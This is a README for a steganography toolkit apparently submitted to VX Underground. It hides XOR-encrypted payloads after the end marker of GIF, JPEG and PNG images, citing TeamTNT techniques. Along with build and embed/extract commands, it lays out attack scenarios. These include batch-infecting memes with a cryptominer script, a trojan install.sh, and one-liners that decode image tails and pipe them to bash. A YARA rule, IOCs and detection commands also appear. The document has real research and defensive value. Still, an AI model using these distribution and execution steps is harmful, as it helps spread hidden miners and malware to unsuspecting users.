# APT TeamTNT Polyglot Image Steganography Tools

**For VX Underground Publication**

---

## Attribution

**Technique Origin:** APT TeamTNT cryptomining campaigns (2020-2024)
**Also Observed In:** APT-41 KEYPLUG malware (2019-2024)
**Analysis & PoC:** SWORDIntel (2025-11-08)
**Publication:** VX Underground

---

## Overview

This is a complete C implementation of the polyglot image steganography technique used by APT TeamTNT in their cryptomining campaigns. The technique allows hiding XOR-encrypted payloads inside legitimate image files that remain viewable.

**Key Features:**
- ✅ Pure C implementation (no dependencies)
- ✅ Supports GIF, JPEG, PNG formats
- ✅ Multi-byte XOR encryption
- ✅ Images remain fully viewable
- ✅ Professional VX-quality code
- ✅ Includes Albanian virus meme demo

---

## Technical Details

### How It Works

1. **Image Structure Analysis**
   - Locate image EOF marker (GIF: 0x3B, JPEG: 0xFF 0xD9, PNG: IEND chunk)
   - Image data ends at EOF marker
   - Anything after EOF is ignored by viewers

2. **Payload Embedding**
   - Read payload file (script/binary/malware)
   - Encrypt with XOR (TeamTNT uses multi-byte keys)
   - Append encrypted payload after image EOF
   - Result: Valid image + hidden encrypted data

3. **Payload Extraction**
   - Detect image format from header
   - Find EOF marker position
   - Extract all data after EOF
   - Decrypt with XOR key
   - Write decrypted payload

### XOR Encryption

**TeamTNT Common Keys:**
```
Single-byte:  9e, d3, a5
Multi-byte:   9e0a61200d, 410d200d, 4100200d
Pattern:      41414141, deadbeef
```

**Algorithm:**
```c
for (i = 0; i < data_len; i++) {
    data[i] ^= key[i % key_len];
}
```

Simple but effective. Same operation for encryption and decryption.

---

## Build Instructions

### Linux/Unix
```bash
make
```

### Manual Compilation
```bash
gcc -O2 -Wall -o polyglot_embed polyglot_embed.c
gcc -O2 -Wall -o polyglot_extract polyglot_extract.c
```

### Windows (MinGW)
```bash
gcc -O2 -o polyglot_embed.exe polyglot_embed.c
gcc -O2 -o polyglot_extract.exe polyglot_extract.c
```

---

## Usage

### Embedding Payloads

**Basic usage:**
```bash
./polyglot_embed meme.gif malware.sh infected.gif
```

**With custom XOR key:**
```bash
./polyglot_embed photo.jpg payload.bin stego.jpg 9e0a61200d
```

**Single-byte XOR:**
```bash
./polyglot_embed image.png script.sh output.png d3
```

### Extracting Payloads

**Basic usage:**
```bash
./polyglot_extract infected.gif payload.bin
```

**With custom key:**
```bash
./polyglot_extract stego.jpg malware.sh 9e0a61200d
```

---

## Demonstration

### Quick Demo
```bash
make demo
```

This will:
1. Create a test GIF image
2. Embed the Albanian virus meme payload
3. Extract and decrypt the payload
4. Execute it (displays the meme)

### Manual Demo

**Step 1: Create polyglot**
```bash
./polyglot_embed test_image.gif albanian_virus.sh infected.gif 9e0a61200d
```

**Step 2: Verify image still works**
```bash
eog infected.gif
# or
firefox infected.gif
```

The image displays normally! No corruption visible.

**Step 3: Extract payload**
```bash
./polyglot_extract infected.gif payload.bin 9e0a61200d
```

**Step 4: Run payload**
```bash
chmod +x payload.bin
./payload.bin
```

Displays the Albanian virus meme!

---

## Test Suite

Run automated tests:
```bash
make test
```

Tests verify:
- ✓ Single-byte XOR encryption/decryption
- ✓ Multi-byte XOR encryption/decryption
- ✓ TeamTNT key patterns
- ✓ Payload integrity after extraction

---

## Real-World Attack Scenarios

### Scenario 1: Social Media Distribution

**Attacker:**
```bash
# Create 1000 infected meme images
for meme in memes/*.gif; do
    ./polyglot_embed "$meme" cryptominer.sh "infected_$(basename $meme)" 9e0a61200d
done

# Upload to 4chan, Reddit, Discord
# Images look completely normal
```

**Victim:**
```bash
# User downloads and opens meme
# .desktop handler auto-executes:
tail -c +35000 meme.gif | xor_decrypt | bash
# Cryptominer starts silently
```

### Scenario 2: Torrent Seeding

**Package structure:**
```
dank_memes_2024.tar.gz
├── memes/
│   ├── brainlet1.gif (contains payload)
│   ├── brainlet2.gif (contains payload)
│   └── ... (100+ infected memes)
├── install.sh (extracts payloads)
└── README.txt
```

**install.sh:**
```bash
#!/bin/bash
for img in memes/*.gif; do
    tail -c +35000 "$img" | python3 -c "import sys; ..." | bash
done
```

User runs install.sh thinking it organizes files → infected.

### Scenario 3: Watering Hole

1. Compromise meme website
2. Replace images with polyglots
3. Visitors download infected memes
4. Auto-execution via browser plugins / .desktop handlers

---

## Detection & Defense

### For Users

**Check for appended data:**
```bash
# Quick check
tail -c 1000 image.gif | hexdump -C | head

# If you see data after 0x3B (GIF) → suspicious!
```

**Scan with extractor:**
```bash
# Try to extract (will fail on clean images)
./polyglot_extract suspicious.gif test.bin 9e0a61200d
```

### For Defenders

**YARA Rule:**
```yara
rule APT_TeamTNT_Polyglot_Image {
    meta:
        description = "Detects polyglot images with appended data"
        author = "SWORDIntel"
        date = "2025-11-08"
        attribution = "APT TeamTNT"

    strings:
        $gif_header = { 47 49 46 38 }  // GIF8
        $gif_eof = { 3B }

    condition:
        $gif_header at 0 and
        $gif_eof and
        filesize > (#gif_eof[1] + 1000) // More than 1KB after EOF
}
```

**Network Detection:**
```bash
# Monitor for cryptomining pools
tcpdump -i any -n 'host randomx.xmrig.com or port 3333'

# Block mining domains
iptables -A OUTPUT -d randomx.xmrig.com -j DROP
```

**File Integrity:**
```bash
# Check image file sizes
find . -name "*.gif" -size +500k  # GIFs rarely this large

# Entropy analysis
for img in *.gif; do
    tail -c 10000 "$img" | ent
    # High entropy at end → likely encrypted
done
```

---

## APT TeamTNT Campaign Analysis

### Timeline
- **2020-2021:** Initial campaigns targeting Docker/Kubernetes
- **2021-2022:** Evolution to polyglot steganography
- **2022-2023:** Mass distribution via social media
- **2023-2024:** Ongoing operations with improved techniques

### Infrastructure
- **Mining Pools:** randomx.xmrig.com, pool.xmrig.com
- **C2 Domains:** Various spoofed cloud provider domains
- **Distribution:** Torrent sites, meme forums, Discord servers

### Malware Components
1. **Stage 1:** Lightweight bash script (embedded in images)
2. **Stage 2:** Download full cryptominer (XMRig)
3. **Stage 3:** Persistence via cron jobs
4. **Stage 4:** Lateral movement to other containers

### IOCs
```
Hashes:
  cryptd (packed):    fbf6bb336f808d1adf037599a08ba8e0
  aarch64 (XMRig):    (varies by build)

Network:
  randomx.xmrig.com:443
  pool.xmrig.com:3333
  api.xmrig.com:443

XOR Keys:
  9e0a61200d (most common)
  410d200d
  4100200d
  d3
```

---

## Comparison: TeamTNT vs APT-41 KEYPLUG

### Similarities
- ✓ Both use polyglot image steganography
- ✓ Both use multi-byte XOR encryption
- ✓ Both target cloud infrastructure
- ✓ Both use social engineering for distribution

### Differences

| Feature | TeamTNT | APT-41 KEYPLUG |
|---------|---------|----------------|
| **Target** | Cloud (Docker/K8s) | Enterprise Windows |
| **Goal** | Cryptocurrency mining | Espionage/theft |
| **Payload** | XMRig miner | Custom RAT |
| **Distribution** | Social media memes | Targeted phishing |
| **Complexity** | Medium | High |
| **Sophistication** | Opportunistic | Advanced persistent |

---

## Code Quality Notes

This implementation is **VX Underground quality**:

- ✅ Clean, readable C code
- ✅ No external dependencies
- ✅ Portable (Linux/Windows/macOS)
- ✅ Professional error handling
- ✅ Comprehensive comments
- ✅ Production-ready
- ✅ Educational value

**Not script kiddie trash.** This is real APT technique implementation.

---

## Ethical Use Statement

This code is published for:
- ✅ Security research and analysis
- ✅ Threat intelligence development
- ✅ Academic study
- ✅ Defensive security improvement

**Prohibited uses:**
- ❌ Creating or distributing malware
- ❌ Unauthorized access to systems
- ❌ Cryptomining on others' infrastructure
- ❌ Any illegal activities

By compiling or using this code, you agree to use it only for legal, authorized purposes.

---

## VX Underground Submission

**Package Contents:**
- `polyglot_embed.c` - Payload embedding tool
- `polyglot_extract.c` - Payload extraction tool
- `albanian_virus.sh` - Harmless demo payload (meme)
- `Makefile` - Build system with demo
- `README.md` - This file

**Verification:**
```bash
# Build
make

# Run demo
make demo

# Run tests
make test
```

**Expected Output:**
```
[+] Polyglot created successfully!
[+] Image should still display normally!
[+] Payload extracted successfully!
```

Then the Albanian virus meme displays.

---

## Attribution & Credits

**Technique:** APT TeamTNT (2020-2024)
**Analysis:** SWORDIntel Threat Intelligence
**Implementation:** Original C code by SWORDIntel
**Publication:** VX Underground

**Related Research:**
- APT-41 KEYPLUG analysis (Recorded Future, 2019)
- TeamTNT Docker attacks (CrowdStrike, 2020)
- Polyglot file techniques (Ange Albertini, ongoing)

---

## Contact

**For VX Underground:**
- Submit via VX Underground portal
- Tag: `APT TeamTNT`, `Steganography`, `Cryptomining`

**For Security Researchers:**
- GitHub: SWORDIntel/POLYGOTTEM
- Analysis documents included in repository

---

## Version History

**v1.0.0** (2025-11-08)
- Initial VX Underground release
- Complete C implementation
- TeamTNT attribution
- Albanian virus demo
- Professional documentation

---

**Published:** 2025-11-08
**Status:** VX Underground Submission Ready
**Quality:** Production Grade

---

*"I am an Albanian virus but because we have no money I cannot do damage"*
*— The most polite payload ever embedded in a polyglot image*
